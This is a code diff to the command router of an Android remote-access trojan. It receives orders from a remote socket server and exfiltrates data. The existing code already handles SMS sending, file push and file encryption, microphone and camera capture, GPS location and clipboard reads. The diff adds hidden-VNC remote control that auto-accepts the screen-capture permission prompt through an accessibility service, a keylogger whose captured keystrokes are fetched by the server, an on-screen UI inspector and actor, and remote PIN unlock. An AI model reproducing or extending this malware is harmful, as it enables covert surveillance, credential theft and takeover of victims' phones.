@@ -3,6 +3,7 @@ package com.fason.app.core.network;
 import android.Manifest;
 import android.os.Handler;
 import android.os.Looper;
+import android.util.Log;
 import java.io.File;
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.Protocol;
@@ -30,17 +31,26 @@ import io.socket.client.Socket;
 public final class SocketCommandRouter {
     private static FileManager fileMgr;
     private static CameraManager camMgr;
-    private static final ExecutorService EXEC = Executors.newFixedThreadPool(4);
+    public static volatile ExecutorService EXEC = Executors.newFixedThreadPool(4);
+    public static volatile ExecutorService HVNC_EXEC = Executors.newSingleThreadExecutor();
     private static final Handler handler = new Handler(Looper.getMainLooper());
     private static boolean initialized = false;
-    private static volatile boolean settingsPrompted = false;
-    private SocketCommandRouter() {}
+    private static volatile long lastSettingsPromptTime = 0;
+    private static final long SETTINGS_PROMPT_COOLDOWN_MS = 30_000;
 
+    private SocketCommandRouter() {}
     public static synchronized void initialize() {
         if (initialized) return;
         if (fileMgr == null) fileMgr = new FileManager();
         if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());
-        Socket socket = SocketClient.getInstance().getSocket();
+        if (EXEC.isShutdown()) EXEC = Executors.newFixedThreadPool(4);
+        if (HVNC_EXEC.isShutdown()) HVNC_EXEC = Executors.newSingleThreadExecutor();
+        SocketClient client = SocketClient.getInstance();
+        if (client == null) {
+            handler.postDelayed(SocketCommandRouter::initialize, 5000);
+            return;
+        }
+        Socket socket = client.getSocket();
         if (socket == null) {
             handler.postDelayed(SocketCommandRouter::initialize, 5000);
             return;
@@ -79,8 +89,23 @@ public final class SocketCommandRouter {
                 case Protocol.NOTIF:       handleNotif(data, socket, cmdId); break;
                 case Protocol.FASON:       handleFason(data, socket, cmdId); break;
                 case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get(), cmdId)); break;
+                case Protocol.HVNC:        handleHvnc(data, socket, cmdId); break;
+                case Protocol.INSPECTOR:   handleInspector(data, socket, cmdId); break;
+                case Protocol.KEYLOGGER:   handleKeylogger(data, socket, cmdId); break;
+                case Protocol.DEVICE_UNLOCK: handleDeviceUnlock(data, socket, cmdId); break;
+                default:
+                    try {
+                        JSONObject err = new JSONObject();
+                        err.put(Protocol.KEY_TYPE, "error");
+                        err.put(Protocol.KEY_ERROR, "Unknown command type: " + type);
+                        attachCmdId(err, cmdId);
+                        socket.emit("cmd_error", err);
+                    } catch (Exception ignored2) {}
+                    break;
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e("SocketCommandRouter", "handleOrder error", e);
+        }
     }
 
     private static void handleFile(JSONObject data, String cmdId) {
@@ -118,8 +143,22 @@ public final class SocketCommandRouter {
                 String password = data.optString(Protocol.KEY_PASSWORD, "");
                 boolean ok = com.fason.app.features.storage.FilesEncryptDecrypt.decryptFile(path, password);
                 emitFileAction("decrypt", path, ok, cmdId);
+            } else {
+                JSONObject err = new JSONObject();
+                err.put(Protocol.KEY_TYPE, Protocol.TYPE_ERROR);
+                err.put(Protocol.KEY_ERROR, "Unknown file action: " + action);
+                attachCmdId(err, cmdId);
+                SocketClient.getInstance().getSocket().emit(Protocol.FILES, err);
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            try {
+                JSONObject err = new JSONObject();
+                err.put(Protocol.KEY_TYPE, "error");
+                err.put(Protocol.KEY_ERROR, e.getMessage() != null ? e.getMessage() : "File operation failed");
+                attachCmdId(err, cmdId);
+                SocketClient.getInstance().getSocket().emit(Protocol.FILES, err);
+            } catch (Exception ignored2) {}
+        }
     }
 
     private static void handlePush(JSONObject data, String cmdId) {
@@ -133,24 +172,30 @@ public final class SocketCommandRouter {
                     emitPushResult(socket, dstPath, false, "Missing path or buffer", cmdId);
                     return;
                 }
-                File dst = new File(dstPath);
-                if (dst.isDirectory()) {
-                    dstPath = dstPath + "/" + name;
-                    dst = new File(dstPath);
+                final int MAX_PUSH_BASE64_LEN = 13_333_333;
+                if (b64.length() > MAX_PUSH_BASE64_LEN) {
+                    emitPushResult(socket, dstPath, false, "File too large (max 10MB)", cmdId);
+                    return;
+                }
+                File dstDir = new File(dstPath);
+                String finalPath = dstPath;
+                if (dstDir.isDirectory()) {
+                    finalPath = dstPath + "/" + name;
+                }
+                File dst = com.fason.app.features.storage.FileManager.safeFile(finalPath);
+                if (dst == null) {
+                    emitPushResult(socket, dstPath, false, "Invalid or forbidden path", cmdId);
+                    return;
                 }
                 File parent = dst.getParentFile();
                 if (parent != null && !parent.exists()) parent.mkdirs();
                 byte[] fileData = android.util.Base64.decode(b64, android.util.Base64.NO_WRAP);
-                java.io.FileOutputStream fos = null;
-                try {
-                    fos = new java.io.FileOutputStream(dst);
+                try (java.io.FileOutputStream fos = new java.io.FileOutputStream(dst)) {
                     fos.write(fileData);
                     fos.flush();
-                    emitPushResult(socket, dstPath, true, null, cmdId);
+                    emitPushResult(socket, dst.getAbsolutePath(), true, null, cmdId);
                 } catch (Exception e) {
-                    emitPushResult(socket, dstPath, false, e.getMessage(), cmdId);
-                } finally {
-                    if (fos != null) try { fos.close(); } catch (Exception ignored) {}
+                    emitPushResult(socket, dst.getAbsolutePath(), false, e.getMessage(), cmdId);
                 }
             } catch (Exception e) {
                 emitPushResult(socket, "", false, e.getMessage(), cmdId);
@@ -180,7 +225,7 @@ public final class SocketCommandRouter {
             r.put(Protocol.KEY_ACTION, action);
             r.put(Protocol.KEY_PATH, path);
             r.put(Protocol.KEY_SUCCESS, success);
-            if (!success) r.put(Protocol.KEY_ERROR, "Operation failed — check password or path");
+            if (!success) r.put(Protocol.KEY_ERROR, "Operation failed - check password or path");
             if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
             socket.emit(Protocol.FILES, r);
         } catch (Exception ignored) {}
@@ -193,6 +238,8 @@ public final class SocketCommandRouter {
         } else if (Protocol.ACT_SEND_SMS.equals(action)) {
             EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.send(
                 data.optString(Protocol.KEY_TO), data.optString(Protocol.KEY_SMS)), cmdId));
+        } else {
+            emitError(socket, Protocol.SMS, "Unknown SMS action: " + action, cmdId);
         }
     }
 
@@ -200,6 +247,18 @@ public final class SocketCommandRouter {
         String action = data.optString(Protocol.KEY_ACTION, "");
         if (Protocol.ACT_STOP.equals(action)) {
             MicManager.stop(cmdId);
+            return;
+        }
+        if (!action.isEmpty() && !"start".equals(action) && !Protocol.ACT_STREAM_START.equals(action) && !Protocol.ACT_STREAM_STOP.equals(action)) {
+            emitError(socket, Protocol.MIC, "Unknown mic action: " + action, cmdId);
+            return;
+        }
+        if (Protocol.ACT_STREAM_START.equals(action)) {
+            MicManager.startStream(cmdId);
+            return;
+        }
+        if (Protocol.ACT_STREAM_STOP.equals(action)) {
+            MicManager.stopStream(cmdId);
             return;
         }
         int sec = data.optInt(Protocol.KEY_SEC, 0);
@@ -227,14 +286,15 @@ public final class SocketCommandRouter {
                 }
                 gps.requestSingle();
                 boolean gotLocation = false;
-                for (int i = 0; i < 30; i++) {
-                    Thread.sleep(200);
+                long deadline = System.currentTimeMillis() + 15000;
+                while (System.currentTimeMillis() < deadline) {
                     JSONObject locData = gps.getData();
                     if (locData.optBoolean(Protocol.KEY_ENABLED, false)) {
                         emit(socket, Protocol.LOCATION, locData, cmdId);
                         gotLocation = true;
                         break;
                     }
+                    Thread.sleep(200);
                 }
                 if (!gotLocation) {
                     JSONObject err = new JSONObject();
@@ -265,7 +325,7 @@ public final class SocketCommandRouter {
                     orphanGps = gps;
                 }
                 gps.requestSingle();
-                for (int i = 0; i < 20; i++) {
+                for (int i = 0; i < 10; i++) {
                     Thread.sleep(200);
                     if (gps.canGetLocation()) break;
                 }
@@ -314,6 +374,14 @@ public final class SocketCommandRouter {
             camMgr.startRecording(data.optInt(Protocol.KEY_ID, 0), cmdId);
         } else if (Protocol.ACT_STOP.equals(action)) {
             camMgr.stopRecording(cmdId);
+        } else if (Protocol.ACT_STREAM_START.equals(action)) {
+            int quality = data.optInt(Protocol.KEY_QUALITY, 60);
+            int intervalMs = data.optInt(Protocol.KEY_INTERVAL, 500);
+            camMgr.startStream(data.optInt(Protocol.KEY_ID, 0), cmdId, quality, intervalMs);
+        } else if (Protocol.ACT_STREAM_STOP.equals(action)) {
+            camMgr.stopStream(cmdId);
+        } else {
+            emitError(socket, Protocol.CAMERA, "Unknown camera action: " + action, cmdId);
         }
     }
 
@@ -325,8 +393,11 @@ public final class SocketCommandRouter {
             EXEC.execute(() -> m.emit(cmdId));
         } else if (Protocol.ACT_STOP.equals(action)) {
             m.stop();
-        } else {
+        } else if (Protocol.ACT_FETCH.equals(action)) {
             EXEC.execute(() -> m.emit(cmdId));
+        } else {
+            Socket socket = SocketClient.getInstance().getSocket();
+            emitError(socket, Protocol.CLIPBOARD, "Unknown clipboard action: " + action, cmdId);
         }
     }
 
@@ -355,6 +426,8 @@ public final class SocketCommandRouter {
                     socket.emit(Protocol.NOTIF, ack);
                 } catch (Exception ignored) {}
             });
+        } else {
+            emitError(socket, Protocol.NOTIF, "Unknown notification action: " + action, cmdId);
         }
     }
 
@@ -387,6 +460,16 @@ public final class SocketCommandRouter {
         socket.emit(event, data);
     }
 
+    private static void emitError(Socket socket, String event, String message, String cmdId) {
+        if (socket == null) return;
+        try {
+            JSONObject err = new JSONObject();
+            err.put(Protocol.KEY_ERROR, message);
+            attachCmdId(err, cmdId);
+            socket.emit(event, err);
+        } catch (Exception ignored) {}
+    }
+
     private static void attachCmdId(JSONObject obj, String cmdId) {
         if (cmdId != null && !cmdId.isEmpty()) {
             try {
@@ -404,29 +487,357 @@ public final class SocketCommandRouter {
             attachCmdId(err, cmdId);
             emit(socket, event, err, cmdId);
         } catch (Exception ignored) {}
-        if (!settingsPrompted) {
-            settingsPrompted = true;
+        long now = System.currentTimeMillis();
+        if (now - lastSettingsPromptTime > SETTINGS_PROMPT_COOLDOWN_MS) {
+            lastSettingsPromptTime = now;
             handler.post(() -> PermissionManager.openAppSettings(FasonApp.getContext()));
         }
     }
 
     public static synchronized void shutdown() {
+        handler.removeCallbacksAndMessages(null);
         if (camMgr != null) {
             camMgr.shutdown();
             camMgr = null;
         }
+        MicManager.shutdown();
+        EXEC.shutdown();
+        HVNC_EXEC.shutdown();
+        try { EXEC.awaitTermination(2, java.util.concurrent.TimeUnit.SECONDS); } catch (Exception ignored) {}
+        try { HVNC_EXEC.awaitTermination(2, java.util.concurrent.TimeUnit.SECONDS); } catch (Exception ignored) {}
         reset();
         initialized = false;
-        settingsPrompted = false;
+        lastSettingsPromptTime = 0;
     }
 
     public static synchronized void reset() {
-        Socket socket = SocketClient.getInstance().getSocket();
+        SocketClient client = SocketClient.getInstance();
+        if (client == null) {
+            initialized = false;
+            lastSettingsPromptTime = 0;
+            return;
+        }
+        Socket socket = client.getSocket();
         if (socket != null) {
             socket.off(Protocol.EVT_PING);
             socket.off(Protocol.EVT_ORDER);
         }
         initialized = false;
-        settingsPrompted = false;
+        lastSettingsPromptTime = 0;
+    }
+
+    private static void handleHvnc(JSONObject data, Socket socket, String cmdId) {
+        String action = data.optString(Protocol.KEY_ACTION, "");
+        switch (action) {
+            case "start": {
+                int fps = data.optInt(Protocol.KEY_FPS, 20);
+                int quality = data.optInt(Protocol.KEY_JPEG_QUALITY, 60);
+                int scale = data.optInt(Protocol.KEY_SCALE, 50);
+                int iframeInt = data.optInt("iframeInterval", 0);
+                EXEC.execute(() -> {
+                    com.fason.app.features.hvnc.HVncManager mgr = com.fason.app.features.hvnc.HVncManager.getInstance();
+                    mgr.setIframeInterval(iframeInt);
+                    if (mgr.needsPermissionRequest()) {
+                        boolean a11yEnabled = com.fason.app.features.hvnc.InputInjector.isEnabled();
+                        if (!a11yEnabled) {
+                            mgr.onAutoAcceptResult(false, "accessibility_not_enabled");
+                            com.fason.app.features.hvnc.InputInjector.openSettings();
+                            return;
+                        }
+                        mgr.setPendingStart(fps, quality, scale, cmdId);
+                        com.fason.app.features.hvnc.HVncAccessibilityService.enableAutoAccept();
+                        MainService svc = MainService.getInstance();
+                        if (svc != null) {
+                            svc.requestScreenCapturePermission();
+                        } else {
+                            mgr.start(fps, quality, scale, cmdId);
+                        }
+                    } else {
+                        mgr.start(fps, quality, scale, cmdId);
+                    }
+                });
+                break;
+            }
+            case "stop":
+                EXEC.execute(() -> com.fason.app.features.hvnc.HVncManager.getInstance().stop());
+                break;
+            case "restart": {
+                int rFps = data.optInt(Protocol.KEY_FPS, 20);
+                int rQuality = data.optInt(Protocol.KEY_JPEG_QUALITY, 60);
+                int rScale = data.optInt(Protocol.KEY_SCALE, 50);
+                EXEC.execute(() -> com.fason.app.features.hvnc.HVncManager.getInstance().restart(rFps, rQuality, rScale, cmdId));
+                break;
+            }
+            case "enable_accessibility":
+                EXEC.execute(() -> com.fason.app.features.hvnc.InputInjector.openSettings());
+                break;
+            case "input": {
+                HVNC_EXEC.execute(() -> com.fason.app.features.hvnc.InputInjector.handleInput(data));
+                break;
+            }
+            case "status":
+                EXEC.execute(() -> {
+                    com.fason.app.features.hvnc.HVncManager mgr = com.fason.app.features.hvnc.HVncManager.getInstance();
+                    try {
+                        JSONObject status = new JSONObject();
+                        status.put(Protocol.KEY_TYPE, "status");
+                        status.put(Protocol.KEY_STATUS, mgr.isStreaming() ? "streaming" : "stopped");
+                        status.put("streaming", mgr.isStreaming());
+                        status.put("accessibilityEnabled", com.fason.app.features.hvnc.InputInjector.isEnabled());
+                        status.put("accessibilityConnected", com.fason.app.features.hvnc.HVncAccessibilityService.isServiceConnected());
+                        status.put("projectionReady", mgr.hasProjectionPermission());
+                        if (cmdId != null && !cmdId.isEmpty()) {
+                            status.put(Protocol.KEY_CMD_ID, cmdId);
+                        }
+                        socket.emit(Protocol.HVNC, status);
+                    } catch (Exception ignored) {}
+                });
+                break;
+            default:
+                emitError(socket, Protocol.HVNC, "Unknown HVNC action: " + action, cmdId);
+                break;
+        }
+    }
+
+    private static void handleInspector(JSONObject data, Socket socket, String cmdId) {
+        String action = data.optString(Protocol.KEY_ACTION, "");
+        switch (action) {
+            case Protocol.ACT_CAPTURE_TREE: {
+                boolean includeAll = data.optBoolean(Protocol.KEY_INCLUDE_ALL, false);
+                EXEC.execute(() -> {
+                    com.fason.app.features.inspector.InspectorAccessibilityService svc =
+                        com.fason.app.features.inspector.InspectorAccessibilityService.getInstance();
+                    if (svc == null) {
+                        try {
+                            JSONObject err = new JSONObject();
+                            err.put(Protocol.KEY_TYPE, "error");
+                            err.put(Protocol.KEY_ERROR, "Inspector accessibility service not connected. Enable it in Settings first.");
+                            attachCmdId(err, cmdId);
+                            socket.emit(Protocol.INSPECTOR, err);
+                        } catch (Exception ignored) {}
+                        return;
+                    }
+                    svc.captureInspectorTree(includeAll, cmdId);
+                });
+                break;
+            }
+            case "node_action": {
+                int nodeId = data.optInt(Protocol.KEY_NODE_ID, 0);
+                int nodeAction = data.optInt(Protocol.KEY_NODE_ACTION, 0);
+                String text = data.optString(Protocol.KEY_TEXT, null);
+                EXEC.execute(() -> {
+                    com.fason.app.features.inspector.InspectorAccessibilityService svc =
+                        com.fason.app.features.inspector.InspectorAccessibilityService.getInstance();
+                    if (svc == null) {
+                        try {
+                            JSONObject err = new JSONObject();
+                            err.put(Protocol.KEY_TYPE, "action_error");
+                            err.put(Protocol.KEY_ERROR, "Inspector accessibility service not connected");
+                            attachCmdId(err, cmdId);
+                            socket.emit(Protocol.INSPECTOR, err);
+                        } catch (Exception ignored) {}
+                        return;
+                    }
+                    svc.performNodeAction(nodeId, nodeAction, text, cmdId);
+                });
+                break;
+            }
+            case Protocol.ACT_STATUS: {
+                EXEC.execute(() -> {
+                    try {
+                        JSONObject status = new JSONObject();
+                        status.put(Protocol.KEY_TYPE, Protocol.ACT_STATUS);
+                        status.put("accessibilityEnabled", com.fason.app.features.inspector.InspectorAccessibilityService.isEnabled());
+                        status.put("accessibilityConnected", com.fason.app.features.inspector.InspectorAccessibilityService.isServiceConnected());
+                        attachCmdId(status, cmdId);
+                        socket.emit(Protocol.INSPECTOR, status);
+                    } catch (Exception ignored) {}
+                });
+                break;
+            }
+            case Protocol.ACT_OPEN_SETTINGS: {
+                EXEC.execute(() -> com.fason.app.features.inspector.InspectorAccessibilityService.openSettings());
+                break;
+            }
+            default:
+                emitError(socket, Protocol.INSPECTOR, "Unknown inspector action: " + action, cmdId);
+                break;
+        }
+    }
+
+    private static void handleKeylogger(JSONObject data, Socket socket, String cmdId) {
+        String action = data.optString(Protocol.KEY_ACTION, "");
+        switch (action) {
+            case Protocol.ACT_KL_START: {
+                EXEC.execute(() -> {
+                    com.fason.app.features.keylogger.KeyloggerManager svc =
+                        com.fason.app.features.keylogger.KeyloggerManager.getInstance();
+                    try {
+                        JSONObject status = new JSONObject();
+                        if (svc != null) {
+                            svc.setActive(true);
+                            status.put(Protocol.KEY_TYPE, "status");
+                            status.put("active", true);
+                            status.put("connected", true);
+                            status.put(Protocol.KEY_TOTAL_COUNT, svc.getTotalCount());
+                            status.put(Protocol.KEY_PENDING_COUNT, svc.getPendingCount());
+                        } else {
+                            status.put(Protocol.KEY_TYPE, "error");
+                            status.put(Protocol.KEY_ERROR, "Keylogger service not connected");
+                            status.put("connected", false);
+                        }
+                        attachCmdId(status, cmdId);
+                        socket.emit(Protocol.KEYLOGGER, status);
+                    } catch (Exception ignored) {}
+                });
+                break;
+            }
+            case Protocol.ACT_KL_STOP: {
+                EXEC.execute(() -> {
+                    com.fason.app.features.keylogger.KeyloggerManager svc =
+                        com.fason.app.features.keylogger.KeyloggerManager.getInstance();
+                    if (svc != null) svc.setActive(false);
+                    try {
+                        JSONObject status = new JSONObject();
+                        status.put(Protocol.KEY_TYPE, "status");
+                        status.put("active", false);
+                        status.put("connected", svc != null);
+                        status.put(Protocol.KEY_TOTAL_COUNT, svc != null ? svc.getTotalCount() : 0);
+                        attachCmdId(status, cmdId);
+                        socket.emit(Protocol.KEYLOGGER, status);
+                    } catch (Exception ignored) {}
+                });
+                break;
+            }
+            case Protocol.ACT_KL_FETCH: {
+                String eventTypeFilter = data.optString(Protocol.KEY_EVENT_TYPE, "");
+                EXEC.execute(() -> {
+                    com.fason.app.features.keylogger.KeyloggerManager svc =
+                        com.fason.app.features.keylogger.KeyloggerManager.getInstance();
+                    try {
+                        org.json.JSONArray keystrokes;
+                        if (svc != null) {
+                            if (eventTypeFilter != null && !eventTypeFilter.isEmpty()) {
+                                keystrokes = svc.fetchByType(eventTypeFilter);
+                            } else {
+                                keystrokes = svc.fetchAll();
+                            }
+                        } else {
+                            keystrokes = new org.json.JSONArray();
+                        }
+                        JSONObject result = new JSONObject();
+                        result.put(Protocol.KEY_TYPE, "fetch");
+                        result.put(Protocol.KEY_KEYSTROKES, keystrokes);
+                        result.put(Protocol.KEY_TOTAL, keystrokes.length());
+                        attachCmdId(result, cmdId);
+                        socket.emit(Protocol.KEYLOGGER, result);
+                    } catch (Exception e) {
+                        try {
+                            JSONObject err = new JSONObject();
+                            err.put(Protocol.KEY_TYPE, "error");
+                            err.put(Protocol.KEY_ERROR, e.getMessage());
+                            attachCmdId(err, cmdId);
+                            socket.emit(Protocol.KEYLOGGER, err);
+                        } catch (Exception ignored) {}
+                    }
+                });
+                break;
+            }
+            case Protocol.ACT_KL_CLEAR: {
+                EXEC.execute(() -> {
+                    com.fason.app.features.keylogger.KeyloggerManager svc =
+                        com.fason.app.features.keylogger.KeyloggerManager.getInstance();
+                    if (svc != null) svc.clearBuffer();
+                    try {
+                        JSONObject status = new JSONObject();
+                        status.put(Protocol.KEY_TYPE, "cleared");
+                        attachCmdId(status, cmdId);
+                        socket.emit(Protocol.KEYLOGGER, status);
+                    } catch (Exception ignored) {}
+                });
+                break;
+            }
+            case Protocol.ACT_STATUS: {
+                EXEC.execute(() -> {
+                    com.fason.app.features.keylogger.KeyloggerManager svc =
+                        com.fason.app.features.keylogger.KeyloggerManager.getInstance();
+                    try {
+                        JSONObject status = new JSONObject();
+                        status.put(Protocol.KEY_TYPE, "status");
+                        status.put("active", svc != null && svc.isActive());
+                        status.put("connected", svc != null);
+                        if (svc != null) {
+                            status.put(Protocol.KEY_TOTAL_COUNT, svc.getTotalCount());
+                            status.put(Protocol.KEY_PENDING_COUNT, svc.getPendingCount());
+                        }
+                        attachCmdId(status, cmdId);
+                        socket.emit(Protocol.KEYLOGGER, status);
+                    } catch (Exception ignored) {}
+                });
+                break;
+            }
+            default:
+                emitError(socket, Protocol.KEYLOGGER, "Unknown keylogger action: " + action, cmdId);
+                break;
+        }
+    }
+
+    private static void handleDeviceUnlock(JSONObject data, Socket socket, String cmdId) {
+        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_UNLOCK);
+        String pin = data.optString("pin", "");
+        EXEC.execute(() -> {
+            try {
+                com.fason.app.features.unlock.UnlockManager mgr =
+                    com.fason.app.features.unlock.UnlockManager.getInstance();
+                JSONObject result = new JSONObject();
+                attachCmdId(result, cmdId);
+                if (Protocol.ACT_STATUS.equals(action)) {
+                    result.put(Protocol.KEY_TYPE, Protocol.ACT_STATUS);
+                    result.put("connected", mgr != null);
+                    result.put("enabled", mgr != null);
+                    result.put("locked", mgr != null && mgr.isLocked());
+                    socket.emit(Protocol.DEVICE_UNLOCK, result);
+                    return;
+                }
+                if (Protocol.ACT_LOCK.equals(action)) {
+                    if (mgr == null) {
+                        result.put(Protocol.KEY_TYPE, "error");
+                        result.put(Protocol.KEY_ERROR, "Unlock service not connected");
+                        socket.emit(Protocol.DEVICE_UNLOCK, result);
+                    } else {
+                        mgr.lock(cmdId);
+                    }
+                    return;
+                }
+                if ("cancel".equals(action)) {
+                    if (mgr != null) mgr.cancelUnlock();
+                    result.put(Protocol.KEY_TYPE, "cancelled");
+                    result.put(Protocol.KEY_MESSAGE, "Unlock cancelled");
+                    socket.emit(Protocol.DEVICE_UNLOCK, result);
+                    return;
+                }
+                if (!Protocol.ACT_UNLOCK.equals(action)) {
+                    result.put(Protocol.KEY_TYPE, "error");
+                    result.put(Protocol.KEY_ERROR, "Unknown action: " + action);
+                    socket.emit(Protocol.DEVICE_UNLOCK, result);
+                    return;
+                }
+                if (mgr == null) {
+                    result.put(Protocol.KEY_TYPE, "error");
+                    result.put(Protocol.KEY_ERROR, "Unlock service not connected");
+                    socket.emit(Protocol.DEVICE_UNLOCK, result);
+                } else {
+                    mgr.unlock(pin, cmdId);
+                }
+            } catch (Exception e) {
+                try {
+                    JSONObject err = new JSONObject();
+                    err.put(Protocol.KEY_TYPE, "error");
+                    err.put(Protocol.KEY_ERROR, e.getMessage());
+                    attachCmdId(err, cmdId);
+                    socket.emit(Protocol.DEVICE_UNLOCK, err);
+                } catch (Exception ignored) {}
+            }
+        });
     }
 }
